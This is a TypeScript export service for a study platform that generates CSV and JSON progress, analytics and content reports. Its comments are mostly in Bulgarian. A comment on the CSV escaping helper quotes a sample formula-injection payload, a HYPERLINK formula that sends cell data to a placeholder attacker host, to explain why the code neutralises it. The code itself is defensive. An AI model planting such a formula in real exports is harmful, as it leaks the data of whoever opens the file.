/**
 * Export Service - Generate CSV and PDF exports of reports and data
 * Supports user progress reports, analytics exports, and content exports
 */

import { db } from '../db';
import { NotFoundError } from '../types';

export interface ExportOptions {
  format: 'csv' | 'json';
  includeDetails?: boolean;
}

/**
 * Една клетка в CSV.
 *
 * ПОПРАВКА (CSV formula injection): стойностите влизаха в файла както са.
 * Excel и LibreOffice четат клетка, започваща с `=`, `+`, `-` или `@`, като
 * ФОРМУЛА и я изпълняват при отваряне. Достатъчно е някой да си сложи име или
 * имейл от вида `=HYPERLINK("http://зло.бг?d="&A1)` — и когато админ отвори
 * експорта, машината му тръгва да изпраща данни навън.
 * Затова: опасното начало се обезврежда с водещ апостроф, а кавичките се
 * удвояват и цялата стойност се обгражда — иначе запетая или нов ред в текста
 * разместват колоните.
 */
const csvCell = (v: any): string => {
  const s = String(v ?? '');
  const safe = /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
  return `"${safe.replace(/"/g, '""')}"`;
};

/** Цял ред: всяка стойност минава през csvCell. */
const csvRow = (...values: any[]): string => values.map(csvCell).join(',') + '\n';

export class ExportService {
  /**
   * Export user progress report as CSV
   */
  static async exportUserProgressCSV(userId: string): Promise<string> {
    const analytics = await db.any<any>(
      `SELECT
        p.content_type,
        p.status,
        COUNT(*) as count,
        AVG(EXTRACT(EPOCH FROM (p.completed_at - p.created_at))/60) as avg_minutes
       FROM progress p
       WHERE p.user_id = $1
       GROUP BY p.content_type, p.status
       ORDER BY p.content_type, p.status`,
      [userId]
    );

    // ПОПРАВКА: `db.one` гърмеше с 500 за несъществуващ потребител — сега 404.
    const userStats = await db.oneOrNone<any>(
      `SELECT
        (SELECT COUNT(*) FROM progress WHERE user_id = $1 AND status = 'completed') as completed,
        (SELECT COUNT(*) FROM progress WHERE user_id = $1 AND status = 'in_progress') as in_progress,
        (SELECT AVG(score) FROM quiz_results WHERE user_id = $1) as avg_quiz_score,
        (SELECT COUNT(*) FROM quiz_results WHERE user_id = $1) as quiz_count
       FROM users WHERE id = $1`,
      [userId]
    );

    if (!userStats) {
      throw new NotFoundError('Потребителят не е намерен');
    }

    let csv = 'User Progress Report\n';
    csv += `Generated: ${new Date().toISOString()}\n\n`;

    csv += 'Summary Statistics\n';
    csv += 'Items Completed,In Progress,Average Quiz Score,Total Quizzes\n';
    csv += csvRow(
      userStats.completed,
      userStats.in_progress,
      userStats.avg_quiz_score || 'N/A',
      userStats.quiz_count
    ) + '\n';

    csv += 'Progress by Content Type\n';
    csv += 'Content Type,Status,Count,Avg Time (minutes)\n';

    analytics.forEach((row: any) => {
      csv += csvRow(row.content_type, row.status, row.count, Math.round(row.avg_minutes || 0));
    });

    return csv;
  }

  /**
   * Export user progress report as JSON
   */
  static async exportUserProgressJSON(userId: string): Promise<any> {
    // ПОПРАВКА: в users няма колона `full_name` — истинската е `name`.
    // Изходното поле остава `full_name`, за да не се чупи форматът на експорта.
    const userStats = await db.oneOrNone<any>(
      `SELECT id, email, name AS full_name, created_at FROM users WHERE id = $1`,
      [userId]
    );

    // ПОПРАВКА: `db.one` гърмеше с 500 („No data returned from the query“) за
    // несъществуващ потребител. Липсващ потребител е 404, не сървърна грешка.
    if (!userStats) {
      throw new NotFoundError('Потребителят не е намерен');
    }

    const analytics = await db.any<any>(
      `SELECT
        p.content_type,
        p.status,
        COUNT(*) as count,
        AVG(EXTRACT(EPOCH FROM (p.completed_at - p.created_at))/60) as avg_minutes
       FROM progress p
       WHERE p.user_id = $1
       GROUP BY p.content_type, p.status
       ORDER BY p.content_type, p.status`,
      [userId]
    );

    const quizStats = await db.one<any>(
      `SELECT
        COUNT(*) as total,
        AVG(score) as average_score,
        MAX(score) as highest_score,
        MIN(score) as lowest_score
       FROM quiz_results
       WHERE user_id = $1`,
      [userId]
    );

    const subjectProgress = await db.any<any>(
      `SELECT DISTINCT ON (s.id)
        s.id,
        s.title,
        COUNT(p.id) as total_items,
        SUM(CASE WHEN p.status = 'completed' THEN 1 ELSE 0 END) as completed_items,
        ROUND(100.0 * SUM(CASE WHEN p.status = 'completed' THEN 1 ELSE 0 END) / NULLIF(COUNT(p.id), 0), 2) as completion_rate
       FROM subjects s
       LEFT JOIN (
         SELECT subject_id, id FROM flashcards
         UNION ALL
         SELECT subject_id, id FROM quizzes
         UNION ALL
         SELECT subject_id, id FROM lectures
         UNION ALL
         SELECT subject_id, id FROM cases
       ) content ON s.id = content.subject_id
       LEFT JOIN progress p ON p.content_id = content.id AND p.user_id = $1
       GROUP BY s.id, s.title
       ORDER BY s.id`,
      [userId]
    );

    return {
      export_date: new Date().toISOString(),
      user: {
        id: userStats.id,
        email: userStats.email,
        full_name: userStats.full_name,
        joined_date: userStats.created_at,
      },
      summary: {
        total_items_engaged: analytics.reduce((sum: number, row: any) => sum + row.count, 0),
        quiz_statistics: {
          total_taken: quizStats.total,
          average_score: parseFloat(quizStats.average_score) || 0,
          highest_score: parseFloat(quizStats.highest_score) || 0,
          lowest_score: parseFloat(quizStats.lowest_score) || 0,
        },
      },
      progress_by_content_type: analytics.map((row: any) => ({
        content_type: row.content_type,
        status: row.status,
        count: row.count,
        average_time_minutes: Math.round(row.avg_minutes || 0),
      })),
      subject_progress: subjectProgress.map((row: any) => ({
        subject_id: row.id,
        subject_name: row.title,
        total_items: row.total_items,
        completed_items: row.completed_items,
        completion_rate: row.completion_rate,
      })),
    };
  }

  /**
   * Export analytics data as CSV
   */
  static async exportAnalyticsCSV(includeUserDetails: boolean = false): Promise<string> {
    let csv = 'Platform Analytics Report\n';
    csv += `Generated: ${new Date().toISOString()}\n\n`;

    // Platform stats
    const platformStats = await db.one<any>(
      `SELECT
        (SELECT COUNT(*) FROM users) as total_users,
        (SELECT COUNT(DISTINCT user_id) FROM progress WHERE completed_at > NOW() - INTERVAL '1 day') as active_today,
        (SELECT COUNT(DISTINCT user_id) FROM progress WHERE completed_at > NOW() - INTERVAL '7 days') as active_week,
        (SELECT COUNT(DISTINCT user_id) FROM progress WHERE completed_at > NOW() - INTERVAL '30 days') as active_month,
        (SELECT COUNT(*) FROM flashcards) + (SELECT COUNT(*) FROM quizzes) +
        (SELECT COUNT(*) FROM lectures) + (SELECT COUNT(*) FROM cases) as total_content,
        (SELECT COUNT(*) FROM quiz_results) as total_quiz_attempts,
        (SELECT AVG(score) FROM quiz_results) as avg_quiz_score`
    );

    csv += 'Platform Statistics\n';
    csv += 'Total Users,Active Today,Active Week,Active Month,Total Content,Total Quiz Attempts,Avg Quiz Score\n';
    csv += csvRow(
      platformStats.total_users,
      platformStats.active_today,
      platformStats.active_week,
      platformStats.active_month,
      platformStats.total_content,
      platformStats.total_quiz_attempts,
      platformStats.avg_quiz_score || 'N/A'
    ) + '\n';

    // Content breakdown
    const contentStats = await db.any<any>(
      `SELECT
        'flashcards' as type,
        COUNT(*) as count,
        (SELECT COUNT(*) FROM progress WHERE content_type = 'flashcard') as engagement
       FROM flashcards
       UNION ALL
       SELECT 'quizzes', COUNT(*), (SELECT COUNT(*) FROM progress WHERE content_type = 'quiz')
       FROM quizzes
       UNION ALL
       SELECT 'lectures', COUNT(*), (SELECT COUNT(*) FROM progress WHERE content_type = 'lecture')
       FROM lectures
       UNION ALL
       SELECT 'cases', COUNT(*), (SELECT COUNT(*) FROM progress WHERE content_type = 'case')
       FROM cases`
    );

    csv += 'Content Statistics\n';
    csv += 'Type,Total Items,User Engagements\n';

    contentStats.forEach((row: any) => {
      csv += csvRow(row.type, row.count, row.engagement);
    });

    if (includeUserDetails) {
      csv += '\n\nUser Activity Details\n';
      csv += 'User ID,Email,Total Items Completed,Quiz Count,Avg Quiz Score,Last Active\n';

      const userDetails = await db.any<any>(
        `SELECT
          u.id,
          u.email,
          (SELECT COUNT(*) FROM progress WHERE user_id = u.id AND status = 'completed') as items_completed,
          (SELECT COUNT(*) FROM quiz_results WHERE user_id = u.id) as quiz_count,
          (SELECT AVG(score) FROM quiz_results WHERE user_id = u.id) as avg_score,
          (SELECT MAX(completed_at) FROM progress WHERE user_id = u.id) as last_active
         FROM users u
         ORDER BY (SELECT COUNT(*) FROM progress WHERE user_id = u.id AND status = 'completed') DESC`
      );

      userDetails.forEach((row: any) => {
        csv += csvRow(
          row.id,
          row.email,
          row.items_completed,
          row.quiz_count,
          row.avg_score || 'N/A',
          row.last_active || 'N/A'
        );
      });
    }

    return csv;
  }

  /**
   * Export analytics data as JSON
   */
  static async exportAnalyticsJSON(includeUserDetails: boolean = false): Promise<any> {
    const platformStats = await db.one<any>(
      `SELECT
        (SELECT COUNT(*) FROM users) as total_users,
        (SELECT COUNT(DISTINCT user_id) FROM progress WHERE completed_at > NOW() - INTERVAL '1 day') as active_today,
        (SELECT COUNT(DISTINCT user_id) FROM progress WHERE completed_at > NOW() - INTERVAL '7 days') as active_week,
        (SELECT COUNT(DISTINCT user_id) FROM progress WHERE completed_at > NOW() - INTERVAL '30 days') as active_month,
        (SELECT AVG(score) FROM quiz_results) as avg_quiz_score`
    );

    const contentStats = await db.any<any>(
      `SELECT
        'flashcards' as type,
        COUNT(*) as count,
        (SELECT COUNT(*) FROM progress WHERE content_type = 'flashcard') as engagement
       FROM flashcards
       UNION ALL
       SELECT 'quizzes', COUNT(*), (SELECT COUNT(*) FROM progress WHERE content_type = 'quiz')
       FROM quizzes
       UNION ALL
       SELECT 'lectures', COUNT(*), (SELECT COUNT(*) FROM progress WHERE content_type = 'lecture')
       FROM lectures
       UNION ALL
       SELECT 'cases', COUNT(*), (SELECT COUNT(*) FROM progress WHERE content_type = 'case')
       FROM cases`
    );

    const data: any = {
      export_date: new Date().toISOString(),
      platform_statistics: {
        total_users: platformStats.total_users,
        active_users: {
          today: platformStats.active_today,
          this_week: platformStats.active_week,
          this_month: platformStats.active_month,
        },
        average_quiz_score: parseFloat(platformStats.avg_quiz_score) || 0,
      },
      content_statistics: contentStats.map((row: any) => ({
        type: row.type,
        total_items: row.count,
        user_engagements: row.engagement,
      })),
    };

    if (includeUserDetails) {
      const userDetails = await db.any<any>(
        `SELECT
          u.id,
          u.email,
          u.name AS full_name, -- ПОПРАВКА: колоната е name, не full_name
          (SELECT COUNT(*) FROM progress WHERE user_id = u.id AND status = 'completed') as items_completed,
          (SELECT COUNT(*) FROM quiz_results WHERE user_id = u.id) as quiz_count,
          (SELECT AVG(score) FROM quiz_results WHERE user_id = u.id) as avg_score,
          (SELECT MAX(completed_at) FROM progress WHERE user_id = u.id) as last_active
         FROM users u
         ORDER BY (SELECT COUNT(*) FROM progress WHERE user_id = u.id AND status = 'completed') DESC`
      );

      data.user_details = userDetails.map((row: any) => ({
        user_id: row.id,
        email: row.email,
        full_name: row.full_name,
        items_completed: row.items_completed,
        quiz_count: row.quiz_count,
        average_quiz_score: parseFloat(row.avg_score) || 0,
        last_active: row.last_active,
      }));
    }

    return data;
  }

  /**
   * Export quiz results as CSV
   */
  static async exportQuizResultsCSV(userId?: string): Promise<string> {
    let csv = 'Quiz Results Export\n';
    csv += `Generated: ${new Date().toISOString()}\n\n`;

    let query = `SELECT
      qr.id,
      q.title as quiz_title,
      u.email,
      qr.score,
      qr.completed_at,
      COUNT(qq.id) as total_questions,
      SUM(CASE WHEN qr.answers ->> qq.id::text = qq.correct_answer THEN 1 ELSE 0 END) as correct_answers
     FROM quiz_results qr
     JOIN quizzes q ON qr.quiz_id = q.id
     JOIN users u ON qr.user_id = u.id
     LEFT JOIN quiz_questions qq ON q.id = qq.quiz_id
     ${userId ? 'WHERE qr.user_id = $1' : ''}
     GROUP BY qr.id, q.title, u.email
     ORDER BY qr.completed_at DESC`;

    const results = userId
      ? await db.any<any>(query, [userId])
      : await db.any<any>(query);

    csv += 'Quiz ID,Quiz Title,User Email,Score,Completed At,Total Questions,Correct Answers\n';

    results.forEach((row: any) => {
      csv += csvRow(
        row.id,
        row.quiz_title,
        row.email,
        row.score,
        row.completed_at,
        row.total_questions,
        row.correct_answers
      );
    });

    return csv;
  }

  /**
   * Export study plan as CSV
   */
  static async exportStudyPlanCSV(userId: string): Promise<string> {
    // ПОПРАВКА (три сгрешени имена наведнъж):
    //  - `spt.scheduled_date` не съществува — колоната е `spt.date`;
    //  - `spt.user_id` не съществува — връзката към потребителя минава
    //    през study_plans (spt.plan_id → sp.id, sp.user_id);
    //  - `spt.completed_at` също няма такава колона. Часът на завършване се
    //    носи от `updated_at`, който се пипа точно когато статусът се сменя.
    const tasks = await db.any<any>(
      `SELECT
        spt.id,
        spt.date AS scheduled_date,
        spt.content_type,
        spt.status,
        spt.estimated_hours,
        CASE WHEN spt.status = 'completed' THEN spt.updated_at END AS completed_at
       FROM study_plan_tasks spt
       JOIN study_plans sp ON sp.id = spt.plan_id
       WHERE sp.user_id = $1
       ORDER BY spt.date ASC`,
      [userId]
    );

    let csv = 'Study Plan Export\n';
    csv += `Generated: ${new Date().toISOString()}\n`;
    csv += `User ID: ${userId}\n\n`;

    csv += 'Scheduled Date,Content Type,Status,Estimated Hours,Completed At\n';

    tasks.forEach((task: any) => {
      csv += csvRow(
        task.scheduled_date,
        task.content_type,
        task.status,
        task.estimated_hours,
        task.completed_at || 'N/A'
      );
    });

    return csv;
  }

  /**
   * Export content library as JSON
   */
  static async exportContentLibraryJSON(subjectId?: string): Promise<any> {
    const subjects = subjectId
      ? await db.any<any>('SELECT id, title, description FROM subjects WHERE id = $1', [subjectId])
      : await db.any<any>('SELECT id, title, description FROM subjects ORDER BY title');

    const contentData: any = {
      export_date: new Date().toISOString(),
      subjects: [],
    };

    for (const subject of subjects) {
      const flashcards = await db.any<any>(
        'SELECT id, question, answer, difficulty FROM flashcards WHERE subject_id = $1 ORDER BY created_at',
        [subject.id]
      );

      const quizzes = await db.any<any>(
        'SELECT id, title, description FROM quizzes WHERE subject_id = $1 ORDER BY created_at',
        [subject.id]
      );

      const lectures = await db.any<any>(
        'SELECT id, title, duration, description FROM lectures WHERE subject_id = $1 ORDER BY created_at',
        [subject.id]
      );

      const cases = await db.any<any>(
        'SELECT id, title, court, year FROM cases WHERE subject_id = $1 ORDER BY created_at',
        [subject.id]
      );

      contentData.subjects.push({
        id: subject.id,
        title: subject.title,
        description: subject.description,
        content: {
          flashcards: flashcards.length,
          quizzes: quizzes.length,
          lectures: lectures.length,
          cases: cases.length,
          total: flashcards.length + quizzes.length + lectures.length + cases.length,
        },
        flashcards: flashcards,
        quizzes: quizzes,
        lectures: lectures,
        cases: cases,
      });
    }

    return contentData;
  }
}
